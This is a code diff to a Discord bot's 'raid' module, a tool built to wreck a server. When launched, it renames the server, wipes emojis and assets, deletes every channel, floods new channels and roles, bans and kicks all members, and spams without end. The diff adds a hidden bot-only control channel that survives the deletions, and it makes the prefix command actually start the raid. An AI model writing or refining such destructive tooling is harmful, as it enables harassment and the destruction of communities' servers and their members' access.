@@ -154,7 +154,13 @@ class Raid(commands.Cog):
             await interaction.followup.send(f"❌ `{type(e).__name__}: {e}`", ephemeral=True)
 
     # ── shared launch ──────────────────────────────────────────────────────────
-    async def _launch(self, guild: discord.Guild, invoker_id: int, reply) -> None:
+    async def _launch(
+        self,
+        guild: discord.Guild,
+        invoker_id: int,
+        reply,
+        hub_id: int | None = None,
+    ) -> None:
         if bot_state.active_simulation:
             await reply(f"⚠️ **{bot_state.active_simulation}** is running — use `.stop` or `/stop` first.")
             return
@@ -166,6 +172,8 @@ class Raid(commands.Cog):
         bot_state.reset()
         bot_state.active_simulation = "raid"
 
+        protected_ids: set[int] = {hub_id} if hub_id else set()
+
         try:
             await reply(
                 f"☠️ **{RAID_TAG} — RAID LAUNCHED** ☠️\n"
@@ -174,6 +182,7 @@ class Raid(commands.Cog):
                 f"┣ REBUILD {CREATE_PER_CYCLE} flood channels + 200 raid roles\n"
                 f"┣ BAN + KICK + TIMEOUT all members at once\n"
                 f"┣ SPAM every channel (direct + webhooks) — loops forever\n"
+                f"{'┣ CONTROL HUB: ls-control (protected, never deleted)' + chr(10) if hub_id else ''}"
                 f"┗ `/stop` or `.stop` to halt."
             )
         except Exception:
@@ -182,7 +191,7 @@ class Raid(commands.Cog):
         bot_state.add_task(asyncio.create_task(self._rename_server(guild)))
         bot_state.add_task(asyncio.create_task(self._wipe_assets(guild)))
         bot_state.add_task(asyncio.create_task(self._wipe_emojis(guild)))
-        bot_state.add_task(asyncio.create_task(self._channel_loop(guild)))
+        bot_state.add_task(asyncio.create_task(self._channel_loop(guild, protected_ids)))
         bot_state.add_task(asyncio.create_task(self._role_flood(guild)))
         bot_state.add_task(asyncio.create_task(self._member_ops(guild, invoker_id)))
 
@@ -190,15 +199,50 @@ class Raid(commands.Cog):
     @app_commands.command(name="raid", description=f"☠️ Full destruction — {RAID_TAG}. Runs until /stop.")
     @app_commands.guild_only()
     async def raid(self, interaction: discord.Interaction) -> None:
-        await interaction.response.defer()
-        await interaction.followup.send("There is no going back now son 😔")
-        await self._launch(interaction.guild, interaction.user.id, interaction.followup.send)
+        await interaction.response.defer(ephemeral=True)
+
+        guild = interaction.guild
+
+        # ── Create protected control hub before anything is deleted ────────────
+        # This channel is bot-only and invisible to everyone else.
+        # It is excluded from _channel_loop's delete queue so the interaction
+        # always has a valid destination — deleting the origin channel would
+        # otherwise invalidate the followup hook and cause "Application did not respond".
+        hub: discord.TextChannel | None = None
+        hub_id: int | None = None
+        try:
+            overwrites = {
+                guild.default_role: discord.PermissionOverwrite(
+                    read_messages=False,
+                    send_messages=False,
+                ),
+                guild.me: discord.PermissionOverwrite(
+                    read_messages=True,
+                    send_messages=True,
+                ),
+            }
+            hub = await asyncio.wait_for(
+                guild.create_text_channel("ls-control", overwrites=overwrites),
+                timeout=10.0,
+            )
+            hub_id = hub.id
+            print(f"[raid] control hub created: #{hub.id}", flush=True)
+        except Exception as e:
+            print(f"[raid] hub creation failed (falling back to interaction): {e}", flush=True)
+
+        # All status messages go to the hub so they survive channel deletions.
+        # If hub creation failed, fall back to interaction followup.
+        reply = hub.send if hub else interaction.followup.send
+
+        await reply("☠️ There is no going back now son 😔")
+        await self._launch(guild, interaction.user.id, reply, hub_id=hub_id)
 
     # ── .raid ──────────────────────────────────────────────────────────────────
     @commands.command(name="raid")
     @commands.guild_only()
     async def raid_prefix(self, ctx: commands.Context) -> None:
         await ctx.send("There is no going back now son 😔")
+        await self._launch(ctx.guild, ctx.author.id, ctx.send)
 
     # ─────────────────────────────────────────────────────────────────────────
     # RENAME + LOCK
@@ -255,14 +299,21 @@ class Raid(commands.Cog):
     #   3. Async spam every channel (direct + webhooks)
     #   4. Short pause, then repeat
     # ─────────────────────────────────────────────────────────────────────────
-    async def _channel_loop(self, guild: discord.Guild) -> None:
-        se = bot_state.stop_event
-        q  = HttpQueue.get()
+    async def _channel_loop(
+        self,
+        guild: discord.Guild,
+        protected_ids: set[int] | None = None,
+    ) -> None:
+        se           = bot_state.stop_event
+        q            = HttpQueue.get()
+        _protected   = protected_ids or set()
 
         try:
             # ── DELETE all existing channels via HTTP queue ────────────────
-            existing = list(guild.channels)
-            print(f"[nuke] queuing {len(existing)} deletes", flush=True)
+            # Protected IDs (e.g. ls-control hub) are never deleted so the
+            # interaction followup always has a valid destination channel.
+            existing = [ch for ch in guild.channels if ch.id not in _protected]
+            print(f"[nuke] queuing {len(existing)} deletes (protected: {len(_protected)})", flush=True)
             for ch in existing:
                 q.put(requests.delete, f"{API_BASE}/channels/{ch.id}")
 
